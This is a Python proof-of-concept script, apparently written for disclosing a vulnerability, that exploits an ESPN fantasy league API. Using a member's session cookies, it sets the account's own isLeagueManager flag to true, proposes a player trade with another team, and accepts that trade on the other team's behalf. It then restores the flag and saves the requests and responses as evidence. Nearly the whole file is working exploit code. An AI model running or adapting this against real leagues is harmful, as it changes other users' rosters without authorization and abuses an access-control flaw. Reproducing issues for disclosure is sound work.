"""Reproduce the LM self-escalation and cross-team trade-accept chain."""

from __future__ import annotations

import argparse
import copy
import json
import sys
import time
from pathlib import Path

from espn_lmtools.client import League
from espn_lmtools.transactions import build_transaction, post_transaction


def team_for_swid(league, swid):
    normalized = swid.strip("{}").upper()
    for team in league.get("teams", []):
        for owner in team.get("owners") or []:
            if owner.strip("{}").upper() == normalized:
                return team
    return None


def roster_ids(team):
    return [
        entry.get("playerId")
        for entry in (team.get("roster") or {}).get("entries", [])
        if entry.get("playerId", -1) > 0
    ]


def locked_players(league):
    locked = set()
    for transaction in league.get("transactions") or []:
        if not (
            str(transaction.get("type", "")).startswith("TRADE") or transaction.get("isPending")
        ):
            continue
        for item in transaction.get("items") or []:
            player_id = item.get("playerId")
            if player_id and player_id > 0:
                locked.add(player_id)
    return locked


def main(argv=None):
    parser = argparse.ArgumentParser(description="LM self-escalation + trade accept chain.")
    parser.add_argument("--league", required=True)
    parser.add_argument("--proposer", required=True, help="account name in --cookies-dir")
    parser.add_argument("--recipient-team", type=int, required=True, help="target team id")
    parser.add_argument("--game", default="fba")
    parser.add_argument("--season", default="2027")
    parser.add_argument("--cookies-dir", type=Path, default=Path("cookies"))
    parser.add_argument("--period", type=int)
    parser.add_argument("--trade-id", help="accept this existing pending trade")
    parser.add_argument("--no-escalate", action="store_true", help="skip the LM escalation")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--yes", action="store_true")
    parser.add_argument("--evidence", type=Path, default=Path("poc-evidence.json"))
    parser.add_argument("--cancel", metavar="TRADE_ID", help="cancel a pending trade instead")
    args = parser.parse_args(argv)

    league_client = League(
        args.league, args.proposer, args.game, args.season, args.cookies_dir
    )
    evidence = []

    def record(step, body, response):
        entry = {
            "step": step,
            "status": getattr(response, "status_code", None),
            "request": body,
            "response": (response.text[:800] if response is not None else None),
        }
        evidence.append(entry)
        print(f"  {step:<38} {entry['status'] if entry['status'] is not None else '--'}")

    if args.cancel:
        league = league_client.get(
            ("mRoster", "mTeam", "mSettings", "mMembers", "mTransactions2")
        )
        team = team_for_swid(league, league_client.swid)
        period = args.period or league.get("status", {}).get("latestScoringPeriod") or 1
        body = build_transaction(
            "TRADE_PROPOSAL",
            team["id"],
            league_client.swid,
            period,
            related=args.cancel,
            execution="CANCEL",
            comment="poc",
        )
        if args.dry_run:
            print(json.dumps(body, indent=2))
            return 0
        record("cancel trade", body, post_transaction(league_client, body))
        return 0

    league = league_client.get(("mRoster", "mTeam", "mSettings", "mMembers", "mTransactions2"))
    period = args.period or league.get("status", {}).get("latestScoringPeriod") or 1

    team_a = team_for_swid(league, league_client.swid)
    if not team_a:
        sys.exit(f"{args.proposer} does not own a team in league {args.league}")
    team_b = next(
        (team for team in league.get("teams", []) if team.get("id") == args.recipient_team), None
    )
    if not team_b:
        sys.exit(f"team {args.recipient_team} not in league {args.league}")
    if team_b["id"] == team_a["id"]:
        sys.exit("target team is your own team")

    locked = locked_players(league)
    pairs = [
        (give, take)
        for give, take in zip(
            reversed(roster_ids(team_a)), reversed(roster_ids(team_b)), strict=False
        )
        if give not in locked and take not in locked
    ][:8]
    if not pairs and not args.trade_id:
        sys.exit("no unlocked player pair between the two teams")

    original_member = league_client.me() or {"id": league_client.swid}
    start_lm = bool(original_member.get("isLeagueManager"))
    print(f"league {args.league}  {args.game} {args.season}  period {period}")
    print(
        f"  attacker : {args.proposer}  team {team_a['id']}  "
        f"(stored isLeagueManager={start_lm})"
    )
    print(
        f"  target   : team {team_b['id']} {team_b.get('location') or ''} "
        f"{team_b.get('nickname') or ''}".rstrip()
    )
    print()

    if args.dry_run:
        dry = copy.deepcopy(league_client.me() or {"id": league_client.swid})
        dry["isLeagueManager"] = True
        print("--- PUT /members/{self} (escalate) ---")
        print(json.dumps(dry, indent=2)[:800])
        body = build_transaction(
            "TRADE_PROPOSAL",
            team_a["id"],
            league_client.swid,
            period,
            items=[
                {
                    "playerId": pairs[0][0],
                    "fromTeamId": team_a["id"],
                    "toTeamId": team_b["id"],
                    "type": "TRADE",
                },
                {
                    "playerId": pairs[0][1],
                    "fromTeamId": team_b["id"],
                    "toTeamId": team_a["id"],
                    "type": "TRADE",
                },
            ],
            lm=True,
            comment="poc",
        )
        print("--- POST /transactions/ (propose) ---")
        print(json.dumps(body, indent=2))
        print("--- PUT /members/{self} (restore) ---")
        print(json.dumps({**dry, "isLeagueManager": start_lm}, indent=2)[:400])
        print("\ndry run: nothing sent")
        return 0

    if not args.yes:
        print("This escalates the account to LM, accepts a trade, then restores the flag.")
        print("Type the league id to continue:")
        if input("> ").strip() != args.league:
            print("aborted")
            return 2

    escalated = False
    exit_code = 1
    try:
        if args.no_escalate:
            print("0. escalation skipped (--no-escalate)")
        elif start_lm:
            print("0. account is already LM; skipping escalation")
        else:
            print("1. escalate: PUT member record with isLeagueManager=true")
            response, body = league_client.set_lm(True, original_member)
            record("PUT member -> isLeagueManager=true", body, response)
            if response.status_code >= 300:
                print(f"   escalation refused: {response.text[:160]}")
                return 1
            if not league_client.is_lm():
                print("   server said OK but the flag did not stick; aborting")
                return 1
            escalated = True
            print("   verified: stored isLeagueManager=true")
            time.sleep(1.0)

        if args.trade_id:
            print(f"2. using existing trade {args.trade_id}")
            trade_id = args.trade_id
        else:
            print("2. propose")
        for give, take in [] if args.trade_id else pairs:
            body = build_transaction(
                "TRADE_PROPOSAL",
                team_a["id"],
                league_client.swid,
                period,
                items=[
                    {
                        "playerId": give,
                        "fromTeamId": team_a["id"],
                        "toTeamId": team_b["id"],
                        "type": "TRADE",
                    },
                    {
                        "playerId": take,
                        "fromTeamId": team_b["id"],
                        "toTeamId": team_a["id"],
                        "type": "TRADE",
                    },
                ],
                lm=escalated,
                comment="lm-chain PoC",
            )
            response = post_transaction(league_client, body)
            record("TRADE_PROPOSAL", body, response)
            if response.status_code < 300:
                trade_id = response.json().get("id")
                print(f"   trade {trade_id}  ({give} <-> {take})")
                break
            if response.status_code == 409 and "locked" in response.text.lower():
                print("   player locked, next pair")
                time.sleep(1.2)
                continue
            print(f"   proposal rejected: {response.text[:160]}")
            return 1
        if not trade_id:
            print("   could not create a proposal")
            return 1
        time.sleep(1.2)

        print("3. accept referencing our own team id")
        body = build_transaction(
            "TRADE_ACCEPT",
            team_a["id"],
            league_client.swid,
            period,
            related=trade_id,
            lm=escalated,
            comment="",
        )
        response = post_transaction(league_client, body)
        record("TRADE_ACCEPT", body, response)
        ok = False
        if response.status_code < 300:
            payload = response.json()
            ok = payload.get("isPending") is False and str(payload.get("relatedTransactionId")) == str(
                trade_id
            )
            print(
                f"   accepted: isPending={payload.get('isPending')} "
                f"executionType={payload.get('executionType')}"
            )
        else:
            print(f"   accept rejected: {response.text[:160]}")
        exit_code = 0 if ok else 1
    finally:
        if escalated:
            print("4. de-escalate: restore original isLeagueManager")
            response, body = league_client.set_lm(start_lm, original_member)
            record("PUT member -> restore", body, response)
            still = league_client.is_lm()
            if still != start_lm:
                print(f"   !!! RESTORE FAILED: stored isLeagueManager={still}, expected {start_lm}")
                print(
                    f"   fix manually: PUT members/{league_client.swid} "
                    f"with isLeagueManager={start_lm}"
                )
                exit_code = 3
            else:
                print(f"   restored to isLeagueManager={start_lm}")

    print()
    if exit_code == 0:
        print("RESULT: chain reproduced - member self-promoted to LM, trade accepted for a team")
        print("        the attacker does not own, then the flag was restored.")
    elif exit_code == 1:
        print("RESULT: not reproduced (see steps above)")
    print(f"  evidence: {args.evidence.resolve()}")
    evidence.append(
        {
            "league": args.league,
            "escalated": escalated,
            "restored_to": start_lm if escalated else None,
            "verdict": {0: "reproduced", 1: "not-reproduced", 3: "restore-failed"}.get(
                exit_code, "unknown"
            ),
        }
    )
    args.evidence.write_text(json.dumps(evidence, indent=2), encoding="utf-8")
    return exit_code


if __name__ == "__main__":
    sys.exit(main())

